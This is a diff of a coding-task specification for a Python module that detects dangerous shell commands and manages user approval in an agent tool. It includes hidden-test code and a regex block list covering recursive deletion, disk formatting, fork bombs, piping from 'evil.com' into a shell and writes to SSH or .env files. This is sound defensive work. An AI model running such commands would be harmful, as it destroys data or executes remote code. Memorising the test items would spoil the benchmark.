@@ -2,275 +2,76 @@
 
 ## Overview
 
-The `approval` library is a Python module comprising 877 lines of code organized into a single source module that implements a comprehensive dangerous command detection and approval system. At its core, the library provides pattern-based detection of potentially hazardous commands, coupled with a thread-safe per-session approval state management mechanism. The module serves as the centralized authority for all dangerous command handling, exposing 31 module-level functions and a single class to facilitate command validation, user prompting, and session-scoped approval tracking.
-
-The library's architecture centers on three primary functional domains: pattern detection via `DANGEROUS_PATTERNS` and the `detect_dangerous_command()` function for identifying risky command inputs; per-session approval state management that maintains thread-safe, session-key-indexed approval records to prevent redundant user prompts within a single session; and approval prompting mechanisms that solicit user confirmation for detected dangerous commands. This design ensures that dangerous commands are consistently identified across the application, user approval decisions are cached appropriately within session boundaries, and the approval workflow remains thread-safe in concurrent execution environments.
-
-The module's single-class design and 31 utility functions provide a focused, composable API for integrating dangerous command detection into larger applications. By consolidating pattern definitions, detection logic, state management, and prompting workflows into one module, `approval` establishes itself as the definitive source of truth for dangerous command handling, enabling consistent security policies across dependent systems.
-
-# Natural Language Instructions
-
-## Implementation Constraints
-
-- All code must live in `/home/ubuntu/workspace/tools/approval.py`
-- The module must be importable as `from tools.approval import ...`
-- Use only Python standard library (contextvars, re, os, threading, unicodedata, etc.) — no external dependencies
-- All function signatures must match the EXACT API specification verbatim
-- All DANGEROUS_PATTERNS must be defined as a module-level list with exact regex strings and descriptions
-- Thread-safe session state using locks for dictionary access
-- Context-local session key binding via `contextvars.ContextVar`
-- No reliance on external config files or hermes_cli imports for core logic (mock them if needed)
-
----
-
-## Behavioral Requirements
-
-### 1. Context Variable Management for Session Keys
-
-The module must maintain a `contextvars.ContextVar` to store the current session key, allowing per-thread/per-async-task isolation of approval state.
-
-- `set_current_session_key(session_key: str) -> contextvars.Token[str]` must set the context variable to the given session key and return a Token that can be used to restore the prior value.
-- `reset_current_session_key(token: contextvars.Token[str]) -> None` must restore the context variable to its prior state using the provided Token.
-- `get_current_session_key(default: str = "default") -> str` must return the session key from the context variable if set, otherwise fall back to the `HERMES_SESSION_KEY` environment variable, and if that is not set, return the `default` parameter (which defaults to `"default"`). Context-local state takes precedence over environment variables.
-
-### 2. Dangerous Command Pattern Detection
-
-The module must define a module-level constant `DANGEROUS_PATTERNS` as a list of tuples, where each tuple is `(regex_pattern: str, description: str)`. The patterns must be defined in this exact order:
-
-```python
-DANGEROUS_PATTERNS = [
-    (r'\brm\s+(-[^\s]*\s+)*/', "delete in root path"),
-    (r'\brm\s+-[^\s]*r', "recursive delete"),
-    (r'\brm\s+--recursive\b', "recursive delete (long flag)"),
-    (r'\bchmod\s+(-[^\s]*\s+)*(777|666|o\+[rwx]*w|a\+[rwx]*w)\b', "world/other-writable permissions"),
-    (r'\bchmod\s+--recursive\b.*(777|666|o\+[rwx]*w|a\+[rwx]*w)', "recursive world/other-writable (long flag)"),
-    (r'\bchown\s+(-[^\s]*)?R\s+root', "recursive chown to root"),
-    (r'\bchown\s+--recursive\b.*root', "recursive chown to root (long flag)"),
-    (r'\bmkfs\b', "format filesystem"),
-    (r'\bdd\s+.*if=', "disk copy"),
-    (r'>\s*/dev/sd', "write to block device"),
-    (r'\bDROP\s+(TABLE|DATABASE)\b', "SQL DROP"),
-    (r'\bDELETE\s+FROM\b(?!.*\bWHERE\b)', "SQL DELETE without WHERE"),
-    (r'\bTRUNCATE\s+(TABLE)?\s*\w', "SQL TRUNCATE"),
-    (r'>\s*/etc/', "overwrite system config"),
-    (r'\bsystemctl\s+(stop|disable|mask)\b', "stop/disable system service"),
-    (r'\bkill\s+-9\s+-1\b', "kill all processes"),
-    (r'\bpkill\s+-9\b', "force kill processes"),
-    (r':\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:', "fork bomb"),
-    (r'\b(bash|sh|zsh|ksh)\s+-[^\s]*c(\s+|$)', "shell command via -c/-lc flag"),
-    (r'\b(python[23]?|perl|ruby|node)\s+-[ec]\s+', "script execution via -e/-c flag"),
-    (r'\b(curl|wget)\b.*\|\s*(ba)?sh\b', "pipe remote content to shell"),
-    (r'\b(bash|sh|zsh|ksh)\s+<\s*<?\s*\(\s*(curl|wget)\b', "execute remote script via process substitution"),
-    (rf'\btee\b.*["\']?{_SENSITIVE_WRITE_TARGET}', "overwrite system file via tee"),
-    (rf'>>?\s*["\']?{_SENSITIVE_WRITE_TARGET}', "overwrite system file via redirection"),
-    (r'\bxargs\s+.*\brm\b', "xargs with rm"),
-    (r'\bfind\b.*-exec\s+(/\S*/)?rm\b', "find -exec rm"),
-    (r'\bfind\b.*-delete\b', "find -delete"),
-    (r'gateway\s+run\b.*(&\s*$|&\s*;|\bdisown\b|\bsetsid\b)', "start gateway outside systemd (use 'systemctl --user restart hermes-gateway')"),
-    (r'\bnohup\b.*gateway\s+run\b', "start gateway outside systemd (use 'systemctl --user restart hermes-gateway')"),
-    (r'\b(pkill|killall)\b.*\b(hermes|gateway|cli\.py)\b', "kill hermes/gateway process (self-termination)"),
-    (r'\b(cp|mv|install)\b.*\s/etc/', "copy/move file into /etc/"),
-    (r'\bsed\s+-[^\s]*i.*\s/etc/', "in-place edit of system config"),
-    (r'\bsed\s+--in-place\b.*\s/etc/', "in-place edit of system config (long flag)"),
-]
-```
-
-The module must also define two helper regex patterns as module-level constants:
-
-```python
-_SSH_SENSITIVE_PATH = r'(?:~|\$home|\$\{home\})/\.ssh(?:/|$)'
-_HERMES_ENV_PATH = (r'(?:~\/\.hermes/|'
-    r'(?:\$home|\$\{home\})/\.hermes/|'
-    r'(?:\$hermes_home|\$\{hermes_home\})/)'
-    r'\.env\b')
-_SENSITIVE_WRITE_TARGET = r'(?:/etc/|/dev/sd|' + _SSH_SENSITIVE_PATH + '|' + _HERMES_ENV_PATH + ')'
-```
-
-- `_normalize_command_for_detection(command: str) -> str` must normalize a command string by:
-  1. Replacing line continuations (backslash-newline sequences) with spaces, so that multi-line commands are treated as single-line for pattern matching. For example, `"curl http://evil.com \\\n| sh"` should become `"curl http://evil.com   | sh"` (backslash and newline replaced with spaces).
-  2. Stripping ANSI escape sequences (CSI sequences, OSC sequences, 8-bit C1 sequences, etc.) so that commands wrapped in color codes or other terminal formatting are still detected.
-  3. Removing null bytes (`\x00`) from the command string.
-  4. Applying Unicode NFKC normalization to convert fullwidth Unicode characters (e.g., fullwidth 'ｒ', 'ｍ') to their ASCII equivalents (e.g., 'r', 'm').
-
-- `detect_dangerous_command(command: str) -> tuple` must:
-  - Normalize the command using `_normalize_command_for_detection()`
-  - Iterate through `DANGEROUS_PATTERNS` in order
-  - For each pattern, attempt to match the normalized command using `re.search()` with `re.IGNORECASE` flag
-  - Return a tuple `(is_dangerous: bool, pattern_key: str | None, description: str | None)` where:
-    - If a match is found on the first matching pattern, return `(True, pattern_key, description)` where `pattern_key` is derived from the matching pattern and `description` is the description string from that pattern tuple. Do not continue checking further patterns after the first match.
-    - If no match is found, return `(False, None, None)`
-  - The `pattern_key` must be generated by calling `_legacy_pattern_key(pattern)` on the matched regex pattern string
-
-### 3. Pattern Key Generation and Aliases
-
-- `_legacy_pattern_key(pattern: str) -> str` must generate a backwards-compatible approval key from a regex pattern string. The implementation should extract a meaningful identifier from the pattern (e.g., the command name or operation type). This is used to create stable approval keys that persist across sessions.
-
-- `_approval_key_aliases(pattern_key: str) -> set[str]` must return a set of all approval keys that should match the given pattern key. This allows approvals granted under one key name to also match related patterns. The function must return at least the pattern_key itself in the set.
-
-- A module-level dictionary `_PATTERN_KEY_ALIASES` must exist (initially empty `{}`) to store any pre-computed alias mappings.
-
-### 4. Per-Session Approval State Management
-
-The module must maintain thread-safe, per-session approval state using a lock-protected dictionary structure. All access to shared state dictionaries (`_session_approvals`, `_session_pending`, `_gateway_callbacks`, `_permanent_approved`) must be protected by acquiring the module-level lock before reading or writing.
-
-- `approve_session(session_key: str, pattern_key: str)` must add `pattern_key` to the set of approved patterns for the given session. This approval is session-scoped only (not permanent). Thread-safe access to `_session_approvals` must be protected by the lock.
-
-- `is_approved(session_key: str, pattern_key: str) -> bool` must return `True` if the pattern is approved for this session (via `approve_session`) OR if it is in the permanent allowlist (via `load_permanent` or `approve_permanent`). Otherwise return `False`. The function must check both session-scoped and permanent approvals. Thread-safe access to `_session_approvals` and `_permanent_approved` must be protected by the lock.
-
-- `clear_session(session_key: str)` must remove all session-scoped approvals and pending requests for the given session, resetting it to a clean state. Thread-safe access to `_session_approvals` and `_session_pending` must be protected by the lock.
-
-### 5. Pending Approval Requests
-
-The module must maintain a per-session queue or storage for pending approval requests (used by gateway approval flow). Multiple pending approvals may be stored for the same session (FIFO queue behavior).
-
-- `submit_pending(session_key: str, approval: dict)` must store a pending approval request (a dict) for the given session. The dict typically contains keys like `'command'`, `'pattern_key'`, `'description'`, etc. Multiple pending approvals may be queued for the same session. Thread-safe access to `_session_pending` must be protected by the lock.
-
-- `pop_pending(session_key: str) -> Optional[dict]` must retrieve and remove the first (oldest) pending approval for the given session in FIFO order. If no pending approval exists, return `None`. Thread-safe access to `_session_pending` must be protected by the lock.
-
-- `has_pending(session_key: str) -> bool` must return `True` if a pending approval exists for the session, `False` otherwise. Thread-safe access to `_session_pending` must be protected by the lock.
-
-### 6. Permanent Allowlist Management
-
-The module must maintain a thread-safe set of permanently approved pattern keys.
-
-- `approve_permanent(pattern_key: str)` must add a pattern key to the permanent allowlist. Thread-safe access to `_permanent_approved` must be protected by the lock.
-
-- `load_permanent(patterns: set)` must bulk-load a set of pattern keys into the permanent allowlist (typically called during initialization from config). Thread-safe access to `_permanent_approved` must be protected by the lock.
-
-- `load_permanent_allowlist() -> set` must read the permanent allowlist from config (via `hermes_cli.config.load_config()` or similar) and return it as a set. If the config does not exist or has no `approvals.command_allowlist`, return an empty set.
-
-- `save_permanent_allowlist(patterns: set)` must persist the permanent allowlist to config storage.
-
-### 7. Approval Mode and Configuration
-
-The module must read approval configuration from `hermes_cli.config.load_config()`.
-
-- `_normalize_approval_mode(mode) -> str` must normalize approval mode values. It must handle:
-  - The boolean value `False` (YAML unquoted) → return `"off"`
-  - The string `"off"` → return `"off"`
-  - The string `"manual"` → return `"manual"`
-  - The string `"smart"` → return `"smart"`
-  - Any other value → return `"off"` as default
-
-- `_get_approval_config() -> dict` must call `hermes_cli.config.load_config()` and return the `approvals` block from the config (or an empty dict if not present).
-
-- `_get_approval_mode() -> str` must:
-  - Call `_get_approval_config()` to get the config dict
-  - Extract the `mode` key from the config
-  - Call `_normalize_approval_mode(mode)` on the extracted value
-  - Return the normalized mode string (`"off"`, `"manual"`, or `"smart"`)
-
-- `_get_approval_timeout() -> int` must:
-  - Call `_get_approval_config()` to get the config dict
-  - Extract the `timeout` key (or `gateway_timeout` as fallback)
-  - Return the timeout value as an integer, defaulting to `60` if not present
-
-### 8. User Approval Prompting (CLI)
-
-- `prompt_dangerous_approval(command: str, description: str, timeout_seconds: int | None = None, allow_permanent: bool = True, approval_callback = None) -> str` must:
-  - Display an interactive prompt to the user asking for approval of a dangerous command
-  - Show the `command` and `description` to the user
-  - Accept user input and return one of: `"once"`, `"session"`, `"always"`, or `"deny"`
-    - `"once"`: approve this command execution only (do not cache approval)
-    - `"session"`: approve this command for the current session (cache in `_session_approvals`)
-    - `"always"`: approve this command permanently (add to permanent allowlist via `approve_permanent`)
-    - `"deny"`: reject the command (do not execute)
-  - If `allow_permanent` is `False`, do not offer the `"always"` option (used when tirith warnings are present)
-  - If `timeout_seconds` is provided, enforce a timeout on the prompt
-  - If `approval_callback` is provided, call it with relevant data
-  - If the user enters an invalid choice (not matching any valid option), return `"deny"` as the default fallback
-  - Return the user's choice as one of the four strings above
-
-### 9. Smart Approval (LLM-based)
-
-- `_smart_approve(command: str, description: str) -> str` must:
-  - Use an auxiliary LLM to assess the risk of the command
-  - Return a string indicating the approval decision (e.g., `"APPROVE"` or `"DENY"`)
-
-### 10. Dangerous Command Checking and Approval Workflow
-
-- `check_dangerous_command(command: str, env_type: str, approval_callback = None) -> dict` must:
-  - Call `detect_dangerous_command(command)` to check if the command is dangerous
-  - If not dangerous, return a dict with `'action': 'allow'` (or similar)
-  - If dangerous:
-    - Get the current session key via `get_current_session_key()`
-    - Check if the pattern is already approved via `is_approved(session_key, pattern_key)`
-    - If approved, return `'action': 'allow'`
-    - If not approved, determine the approval mode via `_get_approval_mode()`
-    - Based on the mode:
-      - `"off"`: return `'action': 'allow'` (no approval required)
-      - `"manual"`: prompt the user via `prompt_dangerous_approval()` and handle their response
-      - `"smart"`: use `_smart_approve()` to decide
-    - Return a dict with the decision and relevant metadata
-
-- `_format_tirith_description(tirith_result: dict) -> str` must:
-  - Take a dict of findings from a security analysis tool (tirith)
-  - Format it into a human-readable description string
-  - Return the formatted string
-
-- `check_all_command_guards(command: str, env_type: str, approval_callback = None) -> dict` must:
-  - Run all pre-execution security checks (currently just `check_dangerous_command`)
-  - When the `HERMES_EXEC_ASK` environment variable is set to `"1"`, call `detect_dangerous_command()` and if the command is dangerous, call `submit_pending()` to store a pending approval request for the current session (obtained via `get_current_session_key()`)
-  - Return a single approval decision dict with keys like `'action'`, `'approved'`, `'reason'`, etc.
-  - The dict must indicate whether the command is allowed to execute
-
-### 11. Gateway Approval Callbacks (Advanced)
-
-The module must support registering per-session callbacks for gateway approval notifications.
-
-- `register_gateway_notify(session_key: str, cb) -> None` must register a callback function for the given session. This callback is invoked when an approval request needs to be sent to the user via the gateway. Thread-safe access to `_gateway_callbacks` must be protected by the lock.
-
-- `unregister_gateway_notify(session_key: str) -> None` must unregister the callback for the given session. Thread-safe access to `_gateway_callbacks` must be protected by the lock.
-
-- `resolve_gateway_approval(session_key: str, choice: str, resolve_all: bool = False) -> int` must:
-  - Process a user's approval/denial choice from the gateway
-  - If `resolve_all` is `False`, resolve only the first (oldest) pending approval in FIFO order
-  - If `resolve_all` is `True`, resolve all pending approvals for the session
-  - Return an integer count of resolved approvals
-
-- `has_blocking_approval(session_key: str) -> bool` must return `True` if the session has one or more blocking gateway approvals waiting, `False` otherwise.
-
-- `pending_approval_count(session_key: str) -> int` must return the number of pending blocking approvals for the session.
-
-### 12. Approval Entry Class
-
-- `_ApprovalEntry` must be a class with `__slots__` defined. It must:
-  - Accept a `data: dict` parameter in `__init__`
-  - Store the dict data internally (in a slot)
-  - Represent a single pending dangerous-command approval within a gateway session
-
-### 13. Module-Level Constants and State
-
-The module must define:
-
-- `_PATTERN_KEY_ALIASES = {}` (initially empty dict for storing alias mappings)
-- A module-level set `_permanent_approved` to store permanently approved pattern keys
-- A module-level dict `_session_approvals` to store per-session approval sets (keyed by session_key)
-- A module-level dict `_session_pending` to store per-session pending approval lists (keyed by session_key, with FIFO queue behavior)
-- A module-level dict `_gateway_callbacks` to store per-session gateway notification callbacks
-- A module-level `threading.Lock` or `threading.RLock` to protect access to the above dicts
-- A `contextvars.ContextVar` to store the current session key
-
----
-
-## Summary of Test Coverage
-
-The test suite validates:
-- Context-local session key binding and restoration
-- Dangerous command detection across 30+ patterns (rm, chmod, chown, mkfs, dd, SQL, shell invocation, pipe-to-shell, fork bomb, gateway protection, self-termination protection, file operations)
-- Multi-line command handling (backslash-newline normalization)
-- ANSI escape sequence stripping (CSI, OSC, 8-bit C1 sequences)
-- Unicode NFKC normalization (fullwidth character conversion)
-- Null byte stripping
-- Safe command filtering (rm on regular files, echo, ls, git)
-- Per-session approval state (approve, check, clear)
-- Pending approval submission and retrieval (FIFO queue behavior)
-- Permanent allowlist loading
-- Approval mode normalization (boolean False → "off", string "off" → "off")
-- Thread-safe session isolation (two concurrent sessions maintain separate pending approvals)
-- prompt_dangerous_approval return values ('once', 'session', 'always', 'deny')
-- prompt_dangerous_approval invalid input handling (invalid choices return 'deny')
-- check_all_command_guards pending approval submission when HERMES_EXEC_ASK=1
+- Project name: approval
+- Total lines of code: 877
+- Number of source modules: 1
+- Classes: 1
+- Module-level functions: 31
+- Module 'approval' docstring: Dangerous command approval -- detection, prompting, and per-session state.
+
+This module is the single source of truth for the dangerous command system:
+- Pattern detection (DANGEROUS_PATTERNS, detect_dangerous_command)
+- Per-session approval state (thread-safe, keyed by session_key)
+- Approval promp
+
+## Natural Language Instructions
+
+Before you start:
+- Create and edit the solution under `/home/ubuntu/workspace` at the exact workspace-relative paths below.
+- Workspace-relative paths for hidden-test imports: `tools/approval.py`.
+- Implement every symbol listed in `Required Tested Symbols`, including underscored/private helpers.
+- Recreate any repo-internal helper behavior locally instead of trying to install private packages.
+
+### Behavioral Requirements
+
+1. Implement the `_ApprovalEntry` class with all its methods:
+   - `__init__(data)`
+2. Implement the function `set_current_session_key(session_key)`
+   Bind the active approval session key to the current context.
+3. Implement the function `reset_current_session_key(token)`
+   Restore the prior approval session key context.
+4. Implement the function `get_current_session_key(default)`
+   Return the active session key, preferring context-local state.
+5. Implement the function `detect_dangerous_command(command)`
+   Check if a command matches any dangerous patterns.
+6. Implement the function `register_gateway_notify(session_key, cb)`
+   Register a per-session callback for sending approval requests to the user.
+7. Implement the function `unregister_gateway_notify(session_key)`
+   Unregister the per-session gateway approval callback.
+8. Implement the function `resolve_gateway_approval(session_key, choice, resolve_all)`
+   Called by the gateway's /approve or /deny handler to unblock
+9. Implement the function `has_blocking_approval(session_key)`
+   Check if a session has one or more blocking gateway approvals waiting.
+10. Implement the function `pending_approval_count(session_key)`
+   Return the number of pending blocking approvals for a session.
+11. Implement the function `submit_pending(session_key, approval)`
+   Store a pending approval request for a session.
+12. Implement the function `pop_pending(session_key)`
+   Retrieve and remove a pending approval for a session.
+13. Implement the function `has_pending(session_key)`
+   Check if a session has a pending approval request.
+14. Implement the function `approve_session(session_key, pattern_key)`
+   Approve a pattern for this session only.
+15. Implement the function `is_approved(session_key, pattern_key)`
+   Check if a pattern is approved (session-scoped or permanent).
+16. Implement the function `approve_permanent(pattern_key)`
+   Add a pattern to the permanent allowlist.
+17. Implement the function `load_permanent(patterns)`
+   Bulk-load permanent allowlist entries from config.
+18. Implement the function `clear_session(session_key)`
+   Clear all approvals and pending requests for a session.
+19. Implement the function `load_permanent_allowlist()`
+   Load permanently allowed command patterns from config.
+20. Implement the function `save_permanent_allowlist(patterns)`
+   Save permanently allowed command patterns to config.
+21. Implement the function `prompt_dangerous_approval(command, description, timeout_seconds, allow_permanent, approval_callback)`
+   Prompt the user to approve a dangerous command (CLI only).
+22. Implement the function `_get_approval_mode()`
+   Read the approval mode from config. Returns 'manual', 'smart', or 'off'.
+23. Implement the function `check_dangerous_command(command, env_type, approval_callback)`
+   Check if a command is dangerous and handle approval.
+24. Implement the function `check_all_command_guards(command, env_type, approval_callback)`
+   Run all pre-exec security checks and return a single approval decision.
 
 ## Required Tested Symbols
 
@@ -295,7 +96,7 @@ The hidden tests import every symbol listed here. Implement all of them, includi
 
 ### Python Version
 
-Python >=3.11
+Python 3.12
 
 ### Workspace
 
@@ -652,7 +453,7 @@ Args:
         prompt_toolkit integration. Signature:
         (command, description, *, allow_permanent=True) -> str.
 
-Returns: 'once', 'session', 'always', or 'deny'. Invalid input returns 'deny'.
+Returns: 'once', 'session', 'always', or 'deny'
 
 ```python
 def prompt_dangerous_approval(command: str, description: str, timeout_seconds: int | None = None, allow_permanent: bool = True, approval_callback = None) -> str:
@@ -665,7 +466,7 @@ def prompt_dangerous_approval(command: str, description: str, timeout_seconds: i
 - `allow_permanent: bool = True`
 - `approval_callback = None`
 
-**Returns:** `str` (one of: `'once'`, `'session'`, `'always'`, `'deny'`)
+**Returns:** `str`
 
 ### 23. `check_dangerous_command` Function
 
@@ -702,11 +503,6 @@ presents them as a single combined approval request. This prevents
 a gateway force=True replay from bypassing one check when only the
 other was shown to the user.
 
-When HERMES_EXEC_ASK environment variable is set to "1", submits
-pending approval requests for dangerous commands detected. The pending
-approval is submitted to the session key obtained from get_current_session_key(),
-which respects context-local bindings set by set_current_session_key().
-
 ```python
 def check_all_command_guards(command: str, env_type: str, approval_callback = None) -> dict:
 ```
@@ -735,136 +531,359 @@ _PATTERN_KEY_ALIASES = {}
 
 ## Implementation Notes
 
-### Node 1: Dangerous Command Detection
+The following behaviors are validated by the test suite:
 
-`detect_dangerous_command(command: str)` returns a tuple of `(is_dangerous: bool, pattern_key: str | None, description: str | None)`.
+### Note 1: test_unquoted_yaml_off_boolean_false_maps_to_off
+Tests symbols: `_get_approval_mode`
 
-The function checks the input command against all patterns in `DANGEROUS_PATTERNS`. The patterns are checked in order, and the function returns on the FIRST match (does not continue checking further patterns):
-
-```
-(r'\brm\s+(-[^\s]*\s+)*/', "delete in root path"),
-(r'\brm\s+-[^\s]*r', "recursive delete"),
-(r'\brm\s+--recursive\b', "recursive delete (long flag)"),
-(r'\bchmod\s+(-[^\s]*\s+)*(777|666|o\+[rwx]*w|a\+[rwx]*w)\b', "world/other-writable permissions"),
-(r'\bchmod\s+--recursive\b.*(777|666|o\+[rwx]*w|a\+[rwx]*w)', "recursive world/other-writable (long flag)"),
-(r'\bchown\s+(-[^\s]*)?R\s+root', "recursive chown to root"),
-(r'\bchown\s+--recursive\b.*root', "recursive chown to root (long flag)"),
-(r'\bmkfs\b', "format filesystem"),
-(r'\bdd\s+.*if=', "disk copy"),
-(r'>\s*/dev/sd', "write to block device"),
-(r'\bDROP\s+(TABLE|DATABASE)\b', "SQL DROP"),
-(r'\bDELETE\s+FROM\b(?!.*\bWHERE\b)', "SQL DELETE without WHERE"),
-(r'\bTRUNCATE\s+(TABLE)?\s*\w', "SQL TRUNCATE"),
-(r'>\s*/etc/', "overwrite system config"),
-(r'\bsystemctl\s+(stop|disable|mask)\b', "stop/disable system service"),
-(r'\bkill\s+-9\s+-1\b', "kill all processes"),
-(r'\bpkill\s+-9\b', "force kill processes"),
-(r':\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:', "fork bomb"),
-(r'\b(bash|sh|zsh|ksh)\s+-[^\s]*c(\s+|$)', "shell command via -c/-lc flag"),
-(r'\b(python[23]?|perl|ruby|node)\s+-[ec]\s+', "script execution via -e/-c flag"),
-(r'\b(curl|wget)\b.*\|\s*(ba)?sh\b', "pipe remote content to shell"),
-(r'\b(bash|sh|zsh|ksh)\s+<\s*<?\s*\(\s*(curl|wget)\b', "execute remote script via process substitution"),
-(rf'\btee\b.*["\']?{_SENSITIVE_WRITE_TARGET}', "overwrite system file via tee"),
-(rf'>>?\s*["\']?{_SENSITIVE_WRITE_TARGET}', "overwrite system file via redirection"),
-(r'\bxargs\s+.*\brm\b', "xargs with rm"),
-(r'\bfind\b.*-exec\s+(/\S*/)?rm\b', "find -exec rm"),
-(r'\bfind\b.*-delete\b', "find -delete"),
-(r'gateway\s+run\b.*(&\s*$|&\s*;|\bdisown\b|\bsetsid\b)', "start gateway outside systemd (use 'systemctl --user restart hermes-gateway')"),
-(r'\bnohup\b.*gateway\s+run\b', "start gateway outside systemd (use 'systemctl --user restart hermes-gateway')"),
-(r'\b(pkill|killall)\b.*\b(hermes|gateway|cli\.py)\b', "kill hermes/gateway process (self-termination)"),
-(r'\b(cp|mv|install)\b.*\s/etc/', "copy/move file into /etc/"),
-(r'\bsed\s+-[^\s]*i.*\s/etc/', "in-place edit of system config"),
-(r'\bsed\s+--in-place\b.*\s/etc/', "in-place edit of system config (long flag)"),
+```python
+    def test_unquoted_yaml_off_boolean_false_maps_to_off(self):
+        with mock_patch("hermes_cli.config.load_config", return_value={"approvals": {"mode": False}}):
+            assert _get_approval_mode() == "off"
 ```
 
-When a match is found, `is_dangerous` is `True`, `pattern_key` is a non-None value, and `description` is the second element of the matched tuple (e.g., `"delete in root path"`, `"recursive delete"`, `"shell command via -c/-lc flag"`, `"pipe remote content to shell"`, `"disk copy"`, `"SQL DROP"`, `"SQL DELETE without WHERE"`).
+### Note 2: test_string_off_still_maps_to_off
+Tests symbols: `_get_approval_mode`
 
-When no pattern matches, `is_dangerous` is `False`, `pattern_key` is `None`, and `description` is `None`.
+```python
+    def test_string_off_still_maps_to_off(self):
+        with mock_patch("hermes_cli.config.load_config", return_value={"approvals": {"mode": "off"}}):
+            assert _get_approval_mode() == "off"
+```
 
-**Safe commands return `(False, None, None)`:** Commands like `echo hello world`, `ls -la /tmp`, and `git status` return `(False, None, None)`.
+### Note 3: test_rm_rf_detected
+Tests symbols: `detect_dangerous_command`
 
-**Recursive delete detection:** The pattern `r'\brm\s+-[^\s]*r'` matches `rm -r mydir`, `rm -rf /tmp/test`, `rm -rfv /var/log`, `rm -fr .`, and `rm -irf somedir`. The pattern `r'\brm\s+--recursive\b'` matches `rm --recursive /tmp`.
+```python
+    def test_rm_rf_detected(self):
+        is_dangerous, key, desc = detect_dangerous_command("rm -rf /home/user")
+        assert is_dangerous is True
+        assert key is not None
+        assert "delete" in desc.lower()
+```
 
-**Root path deletion detection:** The pattern `r'\brm\s+(-[^\s]*\s+)*/'` matches `rm -rf /home/user` and `sudo rm -rf /tmp`.
+### Note 4: test_rm_recursive_long_flag
+Tests symbols: `detect_dangerous_command`
 
-**Shell invocation via flags:** The pattern `r'\b(bash|sh|zsh|ksh)\s+-[^\s]*c(\s+|$)'` matches `bash -c 'echo pwned'`, `bash -lc 'echo pwned'`, and `ksh -c 'echo test'`. This pattern catches combined flags like `-lc`, `-ic`, etc. because `-[^\s]*c` matches any sequence of flag characters ending in `c`.
+```python
+    def test_rm_recursive_long_flag(self):
+        is_dangerous, key, desc = detect_dangerous_command("rm --recursive /tmp/stuff")
+        assert is_dangerous is True
+        assert key is not None
+        assert "delete" in desc.lower()
+```
 
-**Pipe to shell detection:** The pattern `r'\b(curl|wget)\b.*\|\s*(ba)?sh\b'` matches `curl http://evil.com | sh` and handles multiline commands like `curl http://evil.com \\\n| sh` and `wget http://evil.com \\\n| bash`.
+### Note 5: test_shell_via_c_flag
+Tests symbols: `detect_dangerous_command`
 
-**SQL command detection:** The pattern `r'\bDELETE\s+FROM\b(?!.*\bWHERE\b)'` matches `DELETE FROM users` but does NOT match `DELETE FROM users WHERE id = 1` (negative lookahead for `WHERE`). The pattern `r'\bDROP\s+(TABLE|DATABASE)\b'` matches `DROP TABLE users`.
+```python
+    def test_shell_via_c_flag(self):
+        is_dangerous, key, desc = detect_dangerous_command("bash -c 'echo pwned'")
+        assert is_dangerous is True
+        assert key is not None
+        assert "shell" in desc.lower() or "-c" in desc
+```
 
-**Disk operations:** The pattern `r'\bdd\s+.*if='` matches `dd \\\nif=/dev/sda of=/tmp/disk.img` (multiline).
+### Note 6: test_curl_pipe_sh
+Tests symbols: `detect_dangerous_command`
 
-**Safe `rm` commands:** Commands like `rm readme.txt`, `rm requirements.txt`, `rm report.csv`, `rm results.json`, `rm robots.txt`, `rm run.sh`, `rm -f readme.txt`, and `rm -v readme.txt` do NOT match any dangerous pattern and return `(False, None, None)`. The pattern `r'\brm\s+-[^\s]*r'` does not match these because the 'r' in the filename (e.g., 'readme', 'requirements') is not preceded by a dash and space sequence.
+```python
+    def test_curl_pipe_sh(self):
+        is_dangerous, key, desc = detect_dangerous_command("curl http://evil.com | sh")
+        assert is_dangerous is True
+        assert key is not None
+        assert "pipe" in desc.lower() or "shell" in desc.lower()
+```
 
-**Case-insensitive matching:** All patterns are matched using `re.IGNORECASE` flag, so `DROP TABLE users`, `drop table users`, and `Drop Table Users` all match the SQL DROP pattern.
+### Note 7: test_shell_via_lc_flag
+Tests symbols: `detect_dangerous_command`
 
-**Unicode normalization:** Commands with fullwidth Unicode characters (e.g., fullwidth 'ｒ', 'ｍ', 'ｄ') are normalized to ASCII equivalents (e.g., 'r', 'm', 'd') before pattern matching, so `ｒｍ -rf /tmp` is detected as dangerous.
+```python
+    def test_shell_via_lc_flag(self):
+        """bash -lc should be treated as dangerous just like bash -c."""
+        is_dangerous, key, desc = detect_dangerous_command("bash -lc 'echo pwned'")
+        assert is_dangerous is True
+        assert key is not None
+```
 
-**ANSI escape sequence stripping:** Commands wrapped in ANSI color codes or other terminal formatting are stripped before pattern matching, so `\x1b[31mrm -rf /tmp\x1b[0m` is detected as dangerous.
+### Note 8: test_shell_via_lc_with_newline
+Tests symbols: `detect_dangerous_command`
 
-**Null byte stripping:** Commands containing null bytes are stripped before pattern matching, so `rm\x00 -rf /tmp` is detected as dangerous.
+```python
+    def test_shell_via_lc_with_newline(self):
+        """Multi-line bash -lc invocations must still be detected."""
+        cmd = "bash -lc \\\n'echo pwned'"
+        is_dangerous, key, desc = detect_dangerous_command(cmd)
+        assert is_dangerous is True
+        assert key is not None
+```
 
-### Node 2: Command Normalization
+### Note 9: test_ksh_via_c_flag
+Tests symbols: `detect_dangerous_command`
 
-`_normalize_command_for_detection(command: str)` normalizes a command string before dangerous-pattern matching by:
-1. Replacing backslash-newline sequences (`\\\n`) with spaces
-2. Stripping ANSI escape sequences (CSI sequences like `\x1b[...m`, OSC sequences like `\x1b]...`, 8-bit C1 sequences, etc.)
-3. Removing null bytes (`\x00`)
-4. Applying Unicode NFKC normalization to convert fullwidth characters to ASCII
+```python
+    def test_ksh_via_c_flag(self):
+        """ksh -c should be caught by the expanded pattern."""
+        is_dangerous, key, desc = detect_dangerous_command("ksh -c 'echo test'")
+        assert is_dangerous is True
+        assert key is not None
+```
 
-### Node 3: Approval Mode Configuration
+### Note 10: test_drop_table
+Tests symbols: `detect_dangerous_command`
 
-`_get_approval_mode()` reads the approval mode from config and returns a string value.
+```python
+    def test_drop_table(self):
+        is_dangerous, _, desc = detect_dangerous_command("DROP TABLE users")
+        assert is_dangerous is True
+        assert "drop" in desc.lower()
+```
 
-The function reads from `hermes_cli.config.load_config()` and accesses the `["approvals"]["mode"]` key.
+### Note 11: test_delete_without_where
+Tests symbols: `detect_dangerous_command`
 
